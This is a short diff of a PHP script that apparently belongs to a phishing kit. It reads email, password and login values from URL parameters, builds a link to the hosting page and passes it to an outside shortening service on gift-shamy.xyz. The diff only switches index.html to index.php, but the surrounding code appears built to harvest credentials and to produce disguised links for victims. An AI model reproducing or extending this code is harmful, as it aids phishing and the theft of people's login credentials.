@@ -44,7 +44,7 @@ $email = $_GET["email"];
 $password = $_GET["password"];
 $login = $_GET["login"];
 $linky = $_SERVER['HTTP_HOST'];
-$mink ="https://$linky/index.html";
+$mink ="https://$linky/index.php";
 $api = "http://www.gift-shamy.xyz/sh.php?link=$mink"; 
 $result = json_decode(file_get_contents($api), true); 
 $shortt = $result["short"];
